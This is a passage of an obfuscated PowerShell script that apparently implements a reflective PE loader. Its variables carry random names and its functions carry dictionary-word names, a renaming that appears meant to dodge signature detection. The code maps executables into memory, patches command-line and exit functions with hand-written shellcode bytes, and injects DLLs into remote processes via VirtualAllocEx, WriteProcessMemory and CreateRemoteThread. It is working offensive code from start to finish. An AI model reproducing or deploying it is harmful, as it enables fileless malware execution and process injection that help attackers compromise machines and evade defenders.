		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$lTqSCtGJ99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$mVRcZsGx99
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$xhjgUVLp99 = [IntPtr](Cinerama ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$mVRcZsGx99.IMAGE_SECTION_HEADER)))
			$LEWuMgtI99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($xhjgUVLp99, [Type]$mVRcZsGx99.IMAGE_SECTION_HEADER)
			[IntPtr]$lnftzxUw99 = Cinerama ($PEInfo.PEHandle) ($LEWuMgtI99.VirtualAddress)
			
			[UInt32]$WUpGfJgw99 = steakhouses $LEWuMgtI99.Characteristics
			[UInt32]$UcWjJlHk99 = $LEWuMgtI99.VirtualSize
			
			[UInt32]$oUCmxcpi99 = 0
			enumerations -SbQUqohh99 "tyro::VirtualProtect" -PEInfo $PEInfo -StartAddress $lnftzxUw99 -Size $UcWjJlHk99 | Out-Null
			$nYGBOReT99 = $lTqSCtGJ99.VirtualProtect.Invoke($lnftzxUw99, $UcWjJlHk99, $WUpGfJgw99, [Ref]$oUCmxcpi99)
			if ($nYGBOReT99 -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	Function polyphony
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$lTqSCtGJ99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ULFeJOug99,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ldoLQYcv99
		)
		
		$LumKbDtg99 = @() 
		
		$TLnkrdSP99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$oUCmxcpi99 = 0
		
		[IntPtr]$rXfMTUTV99 = $lTqSCtGJ99.GetModuleHandle.Invoke("Kernel32.dll")
		if ($rXfMTUTV99 -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$EPtywDSQ99 = $lTqSCtGJ99.GetModuleHandle.Invoke("KernelBase.dll")
		if ($EPtywDSQ99 -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}
		$cNcxjYqL99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ULFeJOug99)
		$UjCvAtnq99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ULFeJOug99)
	
		[IntPtr]$cHXmHrIO99 = $lTqSCtGJ99.GetProcAddress.Invoke($EPtywDSQ99, "GetCommandLineA")
		[IntPtr]$FkQHBYqp99 = $lTqSCtGJ99.GetProcAddress.Invoke($EPtywDSQ99, "GetCommandLineW")
		if ($cHXmHrIO99 -eq [IntPtr]::Zero -or $FkQHBYqp99 -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $cHXmHrIO99. GetCommandLineW: $FkQHBYqp99"
		}
		[Byte[]]$bcLzXmBh99 = @()
		if ($TLnkrdSP99 -eq 8)
		{
			$bcLzXmBh99 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$bcLzXmBh99 += 0xb8
		
		[Byte[]]$FytyoYPW99 = @(0xc3)
		$TLcIozjB99 = $bcLzXmBh99.Length + $TLnkrdSP99 + $FytyoYPW99.Length
		
		
		$fKtqVpxe99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TLcIozjB99)
		$aPTyHGbR99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TLcIozjB99)
		$lTqSCtGJ99.memcpy.Invoke($fKtqVpxe99, $cHXmHrIO99, [UInt64]$TLcIozjB99) | Out-Null
		$lTqSCtGJ99.memcpy.Invoke($aPTyHGbR99, $FkQHBYqp99, [UInt64]$TLcIozjB99) | Out-Null
		$LumKbDtg99 += ,($cHXmHrIO99, $fKtqVpxe99, $TLcIozjB99)
		$LumKbDtg99 += ,($FkQHBYqp99, $aPTyHGbR99, $TLcIozjB99)
		[UInt32]$oUCmxcpi99 = 0
		$nYGBOReT99 = $lTqSCtGJ99.VirtualProtect.Invoke($cHXmHrIO99, [UInt32]$TLcIozjB99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$oUCmxcpi99)
		if ($nYGBOReT99 = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$KuIFkVsk99 = $cHXmHrIO99
		Auden -Bytes $bcLzXmBh99 -jPtrYrug99 $KuIFkVsk99
		$KuIFkVsk99 = Cinerama $KuIFkVsk99 ($bcLzXmBh99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($UjCvAtnq99, $KuIFkVsk99, $false)
		$KuIFkVsk99 = Cinerama $KuIFkVsk99 $TLnkrdSP99
		Auden -Bytes $FytyoYPW99 -jPtrYrug99 $KuIFkVsk99
		
		$lTqSCtGJ99.VirtualProtect.Invoke($cHXmHrIO99, [UInt32]$TLcIozjB99, [UInt32]$oUCmxcpi99, [Ref]$oUCmxcpi99) | Out-Null
		
		
		[UInt32]$oUCmxcpi99 = 0
		$nYGBOReT99 = $lTqSCtGJ99.VirtualProtect.Invoke($FkQHBYqp99, [UInt32]$TLcIozjB99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$oUCmxcpi99)
		if ($nYGBOReT99 = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$nZankreQ99 = $FkQHBYqp99
		Auden -Bytes $bcLzXmBh99 -jPtrYrug99 $nZankreQ99
		$nZankreQ99 = Cinerama $nZankreQ99 ($bcLzXmBh99.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($cNcxjYqL99, $nZankreQ99, $false)
		$nZankreQ99 = Cinerama $nZankreQ99 $TLnkrdSP99
		Auden -Bytes $FytyoYPW99 -jPtrYrug99 $nZankreQ99
		
		$lTqSCtGJ99.VirtualProtect.Invoke($FkQHBYqp99, [UInt32]$TLcIozjB99, [UInt32]$oUCmxcpi99, [Ref]$oUCmxcpi99) | Out-Null
		
		
		$XuEmtrtw99 = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $XuEmtrtw99)
		{
			[IntPtr]$qjTwMCpK99 = $lTqSCtGJ99.GetModuleHandle.Invoke($Dll)
			if ($qjTwMCpK99 -ne [IntPtr]::Zero)
			{
				[IntPtr]$bOqaDinQ99 = $lTqSCtGJ99.GetProcAddress.Invoke($qjTwMCpK99, "_wcmdln")
				[IntPtr]$ZXvKlfRt99 = $lTqSCtGJ99.GetProcAddress.Invoke($qjTwMCpK99, "_acmdln")
				if ($bOqaDinQ99 -eq [IntPtr]::Zero -or $ZXvKlfRt99 -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$TDkTHSEt99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ULFeJOug99)
				$ADRRCCBj99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ULFeJOug99)
				
				$nLohUIci99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ZXvKlfRt99, [Type][IntPtr])
				$AQOXLXWz99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($bOqaDinQ99, [Type][IntPtr])
				$tCvEKjPq99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TLnkrdSP99)
				$hlIGVrif99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TLnkrdSP99)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($nLohUIci99, $tCvEKjPq99, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($AQOXLXWz99, $hlIGVrif99, $false)
				$LumKbDtg99 += ,($ZXvKlfRt99, $tCvEKjPq99, $TLnkrdSP99)
				$LumKbDtg99 += ,($bOqaDinQ99, $hlIGVrif99, $TLnkrdSP99)
				
				$nYGBOReT99 = $lTqSCtGJ99.VirtualProtect.Invoke($ZXvKlfRt99, [UInt32]$TLnkrdSP99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$oUCmxcpi99)
				if ($nYGBOReT99 = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($TDkTHSEt99, $ZXvKlfRt99, $false)
				$lTqSCtGJ99.VirtualProtect.Invoke($ZXvKlfRt99, [UInt32]$TLnkrdSP99, [UInt32]($oUCmxcpi99), [Ref]$oUCmxcpi99) | Out-Null
				
				$nYGBOReT99 = $lTqSCtGJ99.VirtualProtect.Invoke($bOqaDinQ99, [UInt32]$TLnkrdSP99, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$oUCmxcpi99)
				if ($nYGBOReT99 = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($ADRRCCBj99, $bOqaDinQ99, $false)
				$lTqSCtGJ99.VirtualProtect.Invoke($bOqaDinQ99, [UInt32]$TLnkrdSP99, [UInt32]($oUCmxcpi99), [Ref]$oUCmxcpi99) | Out-Null
			}
		}
		
		
		$LumKbDtg99 = @()
		$qRLKLYgB99 = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		[IntPtr]$EZMizKkp99 = $lTqSCtGJ99.GetModuleHandle.Invoke("mscoree.dll")
		if ($EZMizKkp99 -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$UIlChFeZ99 = $lTqSCtGJ99.GetProcAddress.Invoke($EZMizKkp99, "CorExitProcess")
		if ($UIlChFeZ99 -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$qRLKLYgB99 += $UIlChFeZ99
		
		[IntPtr]$uQWwRWPl99 = $lTqSCtGJ99.GetProcAddress.Invoke($rXfMTUTV99, "ExitProcess")
		if ($uQWwRWPl99 -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$qRLKLYgB99 += $uQWwRWPl99
		
		[UInt32]$oUCmxcpi99 = 0
		foreach ($jHlZroIX99 in $qRLKLYgB99)
		{
			$xRGxLevs99 = $jHlZroIX99
			[Byte[]]$bcLzXmBh99 = @(0xbb)
			[Byte[]]$FytyoYPW99 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			if ($TLnkrdSP99 -eq 8)
			{
				[Byte[]]$bcLzXmBh99 = @(0x48, 0xbb)
				[Byte[]]$FytyoYPW99 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$bsozFxAd99 = @(0xff, 0xd3)
			$TLcIozjB99 = $bcLzXmBh99.Length + $TLnkrdSP99 + $FytyoYPW99.Length + $TLnkrdSP99 + $bsozFxAd99.Length
			
			[IntPtr]$qSqoyLNz99 = $lTqSCtGJ99.GetProcAddress.Invoke($rXfMTUTV99, "ExitThread")
			if ($qSqoyLNz99 -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}
			$nYGBOReT99 = $lTqSCtGJ99.VirtualProtect.Invoke($jHlZroIX99, [UInt32]$TLcIozjB99, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$oUCmxcpi99)
			if ($nYGBOReT99 -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$CMobGgkm99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TLcIozjB99)
			$lTqSCtGJ99.memcpy.Invoke($CMobGgkm99, $jHlZroIX99, [UInt64]$TLcIozjB99) | Out-Null
			$LumKbDtg99 += ,($jHlZroIX99, $CMobGgkm99, $TLcIozjB99)
			
			Auden -Bytes $bcLzXmBh99 -jPtrYrug99 $xRGxLevs99
			$xRGxLevs99 = Cinerama $xRGxLevs99 ($bcLzXmBh99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ldoLQYcv99, $xRGxLevs99, $false)
			$xRGxLevs99 = Cinerama $xRGxLevs99 $TLnkrdSP99
			Auden -Bytes $FytyoYPW99 -jPtrYrug99 $xRGxLevs99
			$xRGxLevs99 = Cinerama $xRGxLevs99 ($FytyoYPW99.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($qSqoyLNz99, $xRGxLevs99, $false)
			$xRGxLevs99 = Cinerama $xRGxLevs99 $TLnkrdSP99
			Auden -Bytes $bsozFxAd99 -jPtrYrug99 $xRGxLevs99
			$lTqSCtGJ99.VirtualProtect.Invoke($jHlZroIX99, [UInt32]$TLcIozjB99, [UInt32]$oUCmxcpi99, [Ref]$oUCmxcpi99) | Out-Null
		}
		Write-Output $LumKbDtg99
	}
	
	
	Function pigmies
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$HJOZAjGe99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$lTqSCtGJ99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[UInt32]$oUCmxcpi99 = 0
		foreach ($Info in $HJOZAjGe99)
		{
			$nYGBOReT99 = $lTqSCtGJ99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$oUCmxcpi99)
			if ($nYGBOReT99 -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$lTqSCtGJ99.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$lTqSCtGJ99.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$oUCmxcpi99, [Ref]$oUCmxcpi99) | Out-Null
		}
	}
	Function disclosing
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$jdNQCSwb99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$mVRcZsGx99 = jeweling
		$Win32Constants = enslave
		$PEInfo = restorers -jdNQCSwb99 $jdNQCSwb99 -mVRcZsGx99 $mVRcZsGx99 -Win32Constants $Win32Constants
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$tiPOKmZn99 = Cinerama ($jdNQCSwb99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$YTpCDQSs99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($tiPOKmZn99, [Type]$mVRcZsGx99.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $YTpCDQSs99.NumberOfNames; $i++)
		{
			$APOwLBHW99 = Cinerama ($jdNQCSwb99) ($YTpCDQSs99.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$yhMtLnPO99 = Cinerama ($jdNQCSwb99) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($APOwLBHW99, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($yhMtLnPO99)
			if ($Name -ceq $FunctionName)
			{
				$iPbEsXrY99 = Cinerama ($jdNQCSwb99) ($YTpCDQSs99.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$pHJpsInC99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($iPbEsXrY99, [Type][UInt16])
				$nvyAPldh99 = Cinerama ($jdNQCSwb99) ($YTpCDQSs99.AddressOfFunctions + ($pHJpsInC99 * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$QqAnjSuL99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($nvyAPldh99, [Type][UInt32])
				return Cinerama ($jdNQCSwb99) ($QqAnjSuL99)
			}
		}
		
		return [IntPtr]::Zero
	}
	Function landlocked
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$sXOvCBLB99,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$OOQlQQxw99,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$NNjQlKkH99
		)
		
		$TLnkrdSP99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$Win32Constants = enslave
		$lTqSCtGJ99 = Gatorade
		$mVRcZsGx99 = jeweling
		
		$yoOHRZzi99 = $false
		if (($NNjQlKkH99 -ne $null) -and ($NNjQlKkH99 -ne [IntPtr]::Zero))
		{
			$yoOHRZzi99 = $true
		}
		
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = motorway -sXOvCBLB99 $sXOvCBLB99 -mVRcZsGx99 $mVRcZsGx99
		$nSaoaPxb99 = $PEInfo.OriginalImageBase
		$ILFnZUQQ99 = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$ILFnZUQQ99 = $false
		}
		
		
		$MLTdouBP99 = $true
		if ($yoOHRZzi99 -eq $true)
		{
			$rXfMTUTV99 = $lTqSCtGJ99.GetModuleHandle.Invoke("kernel32.dll")
			$zShguHvf99 = $lTqSCtGJ99.GetProcAddress.Invoke($rXfMTUTV99, "IsWow64Process")
			if ($zShguHvf99 -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$drDHcxGp99 = $false
			$nYGBOReT99 = $lTqSCtGJ99.IsWow64Process.Invoke($NNjQlKkH99, [Ref]$drDHcxGp99)
			if ($nYGBOReT99 -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($drDHcxGp99 -eq $true) -or (($drDHcxGp99 -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$MLTdouBP99 = $false
			}
			
			$ZJVxSsfL99 = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$ZJVxSsfL99 = $false
			}
			if ($ZJVxSsfL99 -ne $MLTdouBP99)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$MLTdouBP99 = $false
			}
		}
		if ($MLTdouBP99 -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		[IntPtr]$lHFtUGRP99 = [IntPtr]::Zero
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			[IntPtr]$lHFtUGRP99 = $nSaoaPxb99
		}
		$jdNQCSwb99 = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$nvGhDxim99 = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $jdNQCSwb99. If it is loaded in a remote process, this is the address in the remote process.
		if ($yoOHRZzi99 -eq $true)
		{
			$jdNQCSwb99 = $lTqSCtGJ99.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			$nvGhDxim99 = $lTqSCtGJ99.VirtualAllocEx.Invoke($NNjQlKkH99, $lHFtUGRP99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($nvGhDxim99 -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($ILFnZUQQ99 -eq $true)
			{
				$jdNQCSwb99 = $lTqSCtGJ99.VirtualAlloc.Invoke($lHFtUGRP99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$jdNQCSwb99 = $lTqSCtGJ99.VirtualAlloc.Invoke($lHFtUGRP99, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$nvGhDxim99 = $jdNQCSwb99
		}
		
		[IntPtr]$gVHQnoGh99 = Cinerama ($jdNQCSwb99) ([Int64]$PEInfo.SizeOfImage)
		if ($jdNQCSwb99 -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($sXOvCBLB99, 0, $jdNQCSwb99, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = restorers -jdNQCSwb99 $jdNQCSwb99 -mVRcZsGx99 $mVRcZsGx99 -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $gVHQnoGh99
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $nvGhDxim99
		Write-Verbose "StartAddress: $jdNQCSwb99    EndAddress: $gVHQnoGh99"
		
		
		Write-Verbose "Copy PE sections in to memory"
		melanges -sXOvCBLB99 $sXOvCBLB99 -PEInfo $PEInfo -lTqSCtGJ99 $lTqSCtGJ99 -mVRcZsGx99 $mVRcZsGx99
		
		
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		remorseless -PEInfo $PEInfo -nSaoaPxb99 $nSaoaPxb99 -Win32Constants $Win32Constants -mVRcZsGx99 $mVRcZsGx99
		
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($yoOHRZzi99 -eq $true)
		{
			Milton -PEInfo $PEInfo -lTqSCtGJ99 $lTqSCtGJ99 -mVRcZsGx99 $mVRcZsGx99 -Win32Constants $Win32Constants -NNjQlKkH99 $NNjQlKkH99
		}
		else
		{
			Milton -PEInfo $PEInfo -lTqSCtGJ99 $lTqSCtGJ99 -mVRcZsGx99 $mVRcZsGx99 -Win32Constants $Win32Constants
		}
		
		
		if ($yoOHRZzi99 -eq $false)
		{
			if ($ILFnZUQQ99 -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				tyro -PEInfo $PEInfo -lTqSCtGJ99 $lTqSCtGJ99 -Win32Constants $Win32Constants -mVRcZsGx99 $mVRcZsGx99
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		if ($yoOHRZzi99 -eq $true)
		{
			[UInt32]$QhJDDTcO99 = 0
			$nYGBOReT99 = $lTqSCtGJ99.WriteProcessMemory.Invoke($NNjQlKkH99, $nvGhDxim99, $jdNQCSwb99, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$QhJDDTcO99)
			if ($nYGBOReT99 -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($yoOHRZzi99 -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$INHKkciz99 = Cinerama ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$pJgPuKbH99 = prefix @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$UKqRjkdz99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($INHKkciz99, $pJgPuKbH99)
				
				$UKqRjkdz99.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$INHKkciz99 = Cinerama ($nvGhDxim99) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					$YLzDnqOQ99 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$itsIopib99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$nZKLmkBD99 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					$YLzDnqOQ99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$itsIopib99 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$nZKLmkBD99 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$AJTTAOEE99 = $YLzDnqOQ99.Length + $itsIopib99.Length + $nZKLmkBD99.Length + ($TLnkrdSP99 * 2)
				$bzDhyAcb99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($AJTTAOEE99)
				$PEvyIJPf99 = $bzDhyAcb99
				
				Auden -Bytes $YLzDnqOQ99 -jPtrYrug99 $bzDhyAcb99
				$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($YLzDnqOQ99.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($nvGhDxim99, $bzDhyAcb99, $false)
				$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($TLnkrdSP99)
				Auden -Bytes $itsIopib99 -jPtrYrug99 $bzDhyAcb99
				$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($itsIopib99.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($INHKkciz99, $bzDhyAcb99, $false)
				$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($TLnkrdSP99)
				Auden -Bytes $nZKLmkBD99 -jPtrYrug99 $bzDhyAcb99
				$bzDhyAcb99 = Cinerama $bzDhyAcb99 ($nZKLmkBD99.Length)
				
				$rPQQXGIS99 = $lTqSCtGJ99.VirtualAllocEx.Invoke($NNjQlKkH99, [IntPtr]::Zero, [UIntPtr][UInt64]$AJTTAOEE99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($rPQQXGIS99 -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$nYGBOReT99 = $lTqSCtGJ99.WriteProcessMemory.Invoke($NNjQlKkH99, $rPQQXGIS99, $PEvyIJPf99, [UIntPtr][UInt64]$AJTTAOEE99, [Ref]$QhJDDTcO99)
				if (($nYGBOReT99 -eq $false) -or ([UInt64]$QhJDDTcO99 -ne [UInt64]$AJTTAOEE99))
				{
					Throw "Unable to write shellcode to remote process memory."
				}
				$MzscwpQY99 = interpretations -LSvQiNgY99 $NNjQlKkH99 -StartAddress $rPQQXGIS99 -lTqSCtGJ99 $lTqSCtGJ99
				$zShguHvf99 = $lTqSCtGJ99.WaitForSingleObject.Invoke($MzscwpQY99, 20000)
				if ($zShguHvf99 -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$lTqSCtGJ99.VirtualFreeEx.Invoke($NNjQlKkH99, $rPQQXGIS99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			[IntPtr]$ldoLQYcv99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ldoLQYcv99, 0, 0x00)
			$VVwmLWaT99 = polyphony -PEInfo $PEInfo -lTqSCtGJ99 $lTqSCtGJ99 -Win32Constants $Win32Constants -ULFeJOug99 $OOQlQQxw99 -ldoLQYcv99 $ldoLQYcv99
			[IntPtr]$ebLpWLvD99 = Cinerama ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $ebLpWLvD99. Creating thread for the EXE to run in."
			$lTqSCtGJ99.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ebLpWLvD99, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
			while($true)
			{
				[Byte]$CIUblHbi99 = [System.Runtime.InteropServices.Marshal]::ReadByte($ldoLQYcv99, 0)
				if ($CIUblHbi99 -eq 1)
				{
